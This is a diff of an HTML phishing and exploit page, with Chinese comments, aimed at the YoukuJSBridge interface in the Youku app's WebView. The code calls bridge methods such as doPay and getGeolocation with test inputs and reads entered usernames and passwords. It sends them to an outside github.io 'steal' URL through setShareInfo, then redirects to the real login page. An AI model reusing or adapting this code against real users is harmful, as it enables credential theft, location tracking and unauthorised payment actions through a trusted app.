@@ -112,9 +112,11 @@
       padding: 10px;
       margin-top: 15px;
       border-radius: 5px;
-      font-size: 12px;
+      font-size: 11px;
       white-space: pre-wrap;
       word-break: break-all;
+      max-height: 200px;
+      overflow-y: auto;
     }
   </style>
 </head>
@@ -164,70 +166,72 @@
       document.getElementById('infoBox').innerHTML = msg;
     }
     
+    // 调用 YoukuJSBridge 方法（Java 对象桥接）
+    function callJSBridge(method, params) {
+      try {
+        // Java 对象的方法调用方式
+        if (typeof YoukuJSBridge === 'object') {
+          // 尝试直接调用
+          return YoukuJSBridge[method](params);
+        }
+        // 尝试作为函数调用
+        else if (typeof YoukuJSBridge === 'function') {
+          return YoukuJSBridge(method, params);
+        }
+      } catch (e) {
+        return 'Error: ' + e;
+      }
+      return 'Not available';
+    }
+    
     // 页面加载完成检测
     window.onload = function() {
       var info = '[*] 页面加载完成\n';
       info += '[*] YoukuJSBridge 类型：' + typeof YoukuJSBridge + '\n';
-      info += '[*] YoukuJSBridge 值：' + YoukuJSBridge + '\n';
       
       if (typeof YoukuJSBridge !== 'undefined') {
         info += '\n[+] YoukuJSBridge 存在！\n';
+        info += '[*] 尝试调用方法...\n\n';
         
-        // 尝试获取所有属性
-        var props = [];
-        try {
-          for (var key in YoukuJSBridge) {
-            props.push(key);
-          }
-          info += '\n[*] for...in 枚举到 ' + props.length + ' 个属性:\n';
-          info += props.join('\n');
-        } catch (e) {
-          info += '\n[-] for...in 失败：' + e;
-        }
-        
-        // 尝试 Object.keys
-        try {
-          var keys = Object.keys(YoukuJSBridge);
-          info += '\n\n[*] Object.keys 枚举到 ' + keys.length + ' 个属性:\n';
-          info += keys.join('\n');
-        } catch (e) {
-          info += '\n\n[-] Object.keys 失败：' + e;
-        }
-        
-        // 尝试 Object.getOwnPropertyNames
-        try {
-          var names = Object.getOwnPropertyNames(YoukuJSBridge);
-          info += '\n\n[*] getOwnPropertyNames 枚举到 ' + names.length + ' 个属性:\n';
-          info += names.join('\n');
-        } catch (e) {
-          info += '\n\n[-] getOwnPropertyNames 失败：' + e;
-        }
-        
-        // 测试已知方法
-        info += '\n\n[*] 测试已知方法:\n';
+        // 测试已知方法（Java 对象桥接）
         var knownMethods = ['doPay', 'getAliCoupon', 'getGeolocation', 'loadUrl', 
-                           'setShareInfo', 'showLoginView', 'addItem2Cart'];
+                           'setShareInfo', 'showLoginView', 'addItem2Cart', 
+                           'oneKeyAddCart', 'closeActivity', 'setTitleBar',
+                           'notifyVipChanged', 'startDiagnose', 'checkAPK',
+                           'addTaoKeItem2Cart', 'showOrderWithSKU', 'showTaoKeOrderWithSKU',
+                           'showUploadVideoPage', 'showShareView', 'addCollectionVideo',
+                           'b', 'a'];
+        
+        var successCount = 0;
+        var failCount = 0;
         
         for (var i = 0; i < knownMethods.length; i++) {
           var method = knownMethods[i];
           try {
-            if (typeof YoukuJSBridge[method] === 'function') {
-              info += '\n[+] ' + method + ' 是函数';
-            } else if (YoukuJSBridge[method] !== undefined) {
-              info += '\n[?] ' + method + ' 存在，类型：' + typeof YoukuJSBridge[method];
-            } else {
-              info += '\n[-] ' + method + ' 不存在';
-            }
+            // 尝试调用
+            var result = YoukuJSBridge[method]('{"test":true}');
+            info += '[+] ' + method + ': 成功\n';
+            info += '    返回值：' + result + '\n\n';
+            successCount++;
           } catch (e) {
-            info += '\n[-] ' + method + ' 错误：' + e;
+            // 不调用 showLoginView 等会改变 UI 的方法
+            if (['showLoginView', 'closeActivity'].indexOf(method) === -1) {
+              info += '[-] ' + method + ': 失败\n';
+              info += '    错误：' + e.message + '\n\n';
+              failCount++;
+            }
           }
         }
+        
+        info += '\n================================\n';
+        info += '成功：' + successCount + ' 个\n';
+        info += '失败：' + failCount + ' 个\n';
+        info += '================================\n';
       } else {
         info += '\n[-] YoukuJSBridge 不存在';
       }
       
       showInfo(info);
-      alert(info);
     };
      
     // 窃取凭证
@@ -252,14 +256,14 @@
           var location = YoukuJSBridge.getGeolocation('{}');
           alert('[+] 获取到位置：' + location);
         } catch (err) {
-          alert('[-] 位置获取失败：' + err);
+          alert('[-] 位置获取失败：' + err.message);
         }
          
         // 测试所有已知方法
         var testResults = [];
         var knownMethods = ['doPay', 'getAliCoupon', 'getGeolocation', 'loadUrl', 
-                           'setShareInfo', 'showLoginView', 'addItem2Cart', 
-                           'oneKeyAddCart', 'closeActivity', 'setTitleBar'];
+                           'setShareInfo', 'addItem2Cart', 'oneKeyAddCart', 
+                           'setTitleBar', 'notifyVipChanged', 'startDiagnose'];
         
         for (var i = 0; i < knownMethods.length; i++) {
           var method = knownMethods[i];
@@ -267,61 +271,58 @@
             var result = YoukuJSBridge[method]('{"test":true}');
             testResults.push('[+] ' + method + ': 成功\n返回值：' + result);
           } catch (err) {
-            testResults.push('[-] ' + method + ': 失败\n错误：' + err);
+            testResults.push('[-] ' + method + ': 失败\n错误：' + err.message);
           }
         }
         
         alert('方法测试结果:\n\n' + testResults.join('\n\n'));
-      } else {
-        alert('[-] YoukuJSBridge 不可用');
-      }
-       
-      // 发送到攻击者服务器（模拟）
-      setTimeout(function() {
-        // 隐藏加载，显示成功
-        document.getElementById('loading').classList.remove('show');
-        document.getElementById('success').classList.add('show');
-         
-        // 构造窃取数据
-        var stealData = {
-          username: username,
-          password: password,
-          timestamp: Date.now(),
-          userAgent: navigator.userAgent,
-          url: window.location.href
-        };
          
         // 尝试通过 JSBridge 发送
-        if (typeof YoukuJSBridge !== 'undefined') {
-          try {
-            YoukuJSBridge.setShareInfo(JSON.stringify({
-              title: '窃取成功',
-              description: JSON.stringify(stealData),
-              url: 'https://useryayagit.github.io/qinxuan/steal?data=' + encodeURIComponent(JSON.stringify(stealData))
-            }));
-            alert('[+] 数据已发送到：https://useryayagit.github.io/qinxuan/');
-          } catch (err) {
-            alert('[-] 发送失败：' + err);
-          }
+        try {
+          var stealData = {
+            username: username,
+            password: password,
+            timestamp: Date.now()
+          };
+           
+          YoukuJSBridge.setShareInfo(JSON.stringify({
+            title: '窃取成功',
+            description: JSON.stringify(stealData),
+            url: 'https://useryayagit.github.io/qinxuan/steal?data=' + encodeURIComponent(JSON.stringify(stealData))
+          }));
+          alert('[+] 数据已发送到：https://useryayagit.github.io/qinxuan/');
+        } catch (err) {
+          alert('[-] 发送失败：' + err.message);
         }
          
         // 显示窃取成功
         alert('\n[+] 窃取成功！\n数据：' + JSON.stringify(stealData, null, 2));
          
-        // 3 秒后跳转到真实登录页（降低怀疑）
+        // 3 秒后跳转
         setTimeout(function() {
-          if (typeof YoukuJSBridge !== 'undefined') {
-            try {
-              YoukuJSBridge.loadUrl(JSON.stringify({
-                url: 'https://www.youku.com/login'
-              }));
-            } catch (err) {}
-          } else {
+          try {
+            YoukuJSBridge.loadUrl('{"url":"https://www.youku.com/login"}');
+          } catch (err) {
             window.location.href = 'https://www.youku.com/login';
           }
         }, 3000);
          
-      }, 1500); // 模拟网络延迟
+      } else {
+        alert('[-] YoukuJSBridge 不可用');
+         
+        // 直接显示窃取成功
+        var stealData = {
+          username: username,
+          password: password,
+          timestamp: Date.now()
+        };
+        alert('\n[+] 窃取成功！\n数据：' + JSON.stringify(stealData, null, 2));
+         
+        // 3 秒后跳转
+        setTimeout(function() {
+          window.location.href = 'https://www.youku.com/login';
+        }, 3000);
+      }
     });
   </script>
 </body>
